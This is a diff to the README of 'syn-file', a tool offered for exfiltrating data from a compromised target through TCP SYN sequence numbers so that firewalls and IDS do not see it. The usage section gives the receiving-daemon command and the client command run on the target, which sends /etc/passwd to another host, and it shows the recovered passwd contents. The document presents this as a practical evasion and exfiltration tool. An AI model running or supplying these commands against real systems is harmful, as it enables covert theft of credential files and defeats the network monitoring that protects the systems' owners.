@@ -4,23 +4,23 @@ Exfiltrate data from a compromised target using covert channels.
 
 ##Cryptography: covert channels
 
-**syn-file** is a software that allows data exfiltration using TCP SYN sequency number packets.
-In that way it is possible to bypass firewalls or alert IDS as no TCP connection is ever opened.
+**syn-file** is a software that allows data exfiltration using TCP SYN sequence number packets.
+In that way it is possible to bypass firewalls or IDS as no TCP connection is ever opened... similar to SYN scanning.
 
-To be faster exfiliating data, a useful codification technique is used. Encoding 4 chars in a integer like this:
+To be faster exfiltriating data, a useful codification technique is used. Encoding 4 chars in a integer like this:
 
 ```seq= buf[0] << 24 | buf[1] << 16 | buf[2] << 8 | buf[3];```
 
 ##Background
 
-There are some tools to deploy covert channels using ICMP protocol padding the content in the payload section... suspicious!
-But I have not seen any tool to deploy it using TCP seq numbers, also in **syn-file** the payload is left empty ;-)
+There are some tools to deploy covert channels, mainly using ICMP protocol, padding the content in the payload section... suspicious!
+But I have not seen any tool to deploy it using TCP sequence numbers, also in **syn-file** the payload is left empty ;-)
 
 
 ##usage / example
 
 
-server
+###server
 ```
 # ./syn-daemon -i eth0 -s 192.168.1.155 -f file.bin
 -i interface
@@ -46,10 +46,10 @@ libcap rule: "src host 192.168.1.155"
 ...
 ```
 
-And "passwd" is:
+And "passwd" recovered is:
 ```
 # cat passwd 
-:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
+at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
 avahi:x:481:481:User for Avahi:/run/avahi-daemon:/bin/false
 avahi-autoipd:x:493:493:User for Avahi IPv4LL:/var/lib/avahi-autoipd:/bin/false
 bin:x:1:1:bin:/bin:/bin/bash
@@ -59,11 +59,12 @@ dnsmasq:x:486:65534:dnsmasq:/var/lib/empty:/bin/false
 ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
 games:x:12:100:Games account:/var/games:/bin/bash
 gdm:x:478:477:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
+...
 ```
 
 
 
-client
+###client (target)
 ```
 # ./syn-file -i eth0 -d 192.168.1.158 -f /etc/passwd -p 8080 -P 8081
 -i interface
